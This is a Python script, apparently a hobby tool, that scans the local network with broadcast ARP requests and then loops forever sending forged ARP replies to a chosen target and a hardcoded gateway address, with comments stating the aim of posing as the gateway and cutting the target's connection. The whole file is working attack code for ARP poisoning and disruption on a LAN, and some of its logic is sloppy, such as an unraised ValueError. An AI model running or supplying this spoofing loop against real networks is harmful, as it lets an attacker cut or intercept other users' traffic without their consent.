import re
from traceback import print_tb
import kamene.all as scapy
import time
import os
import sys
import threading
import socket


class ArpManager:
    def __init__(self, verbose=False):
        #get local ip
        self.localIp = self.GetLocalIp()
        self.verbose = verbose
        self.arpTable = {}
        if self.verbose:
            #show local ip 
            print("Local IP: " + self.localIp)
            print("Initializing ARP table...")
        for x in range(1, 4):
            self.arpTable.update(self._GetNetworkDevices(1))
            if self.verbose:
                print(f"{x}/3")
        if self.verbose:
            print("ARP table initialized")
            print(self.arpTable)

        #initialize the thread to update the arp table
        self.updateArpTableThread = threading.Thread(target=self.updateArpTable)
    def GetLocalIp(self):
        return socket.gethostbyname(socket.gethostname())

    def GetMac(self, ip):
        #list ip table dictioanry
        for key, value in self.arpTable.items():
            print(f"{key} - {ip}")
            if key == ip:
                return value

        raise ValueError("IP not found in the arp table")
    def SpoofTarget(self, ip, gateway):
        """
        Spoof the target's arp table to make it think that you are the gateway
        """
        #get the mac address of the target
        targetMac = self.GetMac(ip)
        #get the mac address of the gateway
        gatewayMac = self.GetMac(gateway)
        while True:
            #cut the connection between the target and the gateway
            scapy.send(scapy.ARP(op=2, pdst=ip, hwdst=targetMac, psrc=gateway, hwsrc=gatewayMac), verbose=0)
            #cut the connection between the gateway and the target
            scapy.send(scapy.ARP(op=2, pdst=gateway, hwdst=gatewayMac, psrc=ip, hwsrc=targetMac), verbose=0)
            time.sleep(2)
            
            
    def updateArpTable(self):
        """
        Update the arp table
        """
        while True:
            self.arpTable.update(self._GetNetworkDevices(1))
            time.sleep(5)

    def _GetNetworkDevices(self, deepLevel : int):
        """
        Get all devices in the network
        deepLevel: define the mask of the network
                   mask               ip range
            1 : 255.255.255.0 -> 256    
            2 : 255.255.0.0   -> 65,536   
            3 : 255.0.0.0     -> 16,777,216 
        warning: more deepLevel = more time to scan and less accuracy
        """

        #target ip is local ip without last octet
        targetIp = self.localIp.split('.')
        targetIp = targetIp[0] + '.' + targetIp[1] + '.' + targetIp[2] + '.' + '1'
        
        #change mask of the network by deepLevel
        if deepLevel == 1:
            target_ip = targetIp +"/24"
        elif deepLevel == 2:
            target_ip = targetIp +"/16"
        elif deepLevel == 3:
            target_ip = targetIp +"/8"
        else:
            ValueError("deepLevel must be between 1 and 3")
        arp = scapy.ARP(pdst=target_ip)
        # create the Ether broadcast packet
        # ff:ff:ff:ff:ff:ff MAC address indicates broadcasting
        ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        # stack them
        packet = ether/arp

        result = scapy.srp(packet, timeout=1, verbose=0)[0]

        # a list of clients, we will fill this in the upcoming loop
        clients = {}
        for sent, received in result:
            # for each response, append ip and mac address to `clients` list
            clients[received.psrc] = received.hwsrc

        return clients

manager = ArpManager(verbose=True)
#show ip and ask for an ip to spoof and get the mac address of the selected ip
print(manager.arpTable)
ip = input("Enter an ip to spoof: ")
print(manager.GetMac(ip))
manager.SpoofTarget(ip, "192.168.161.136")

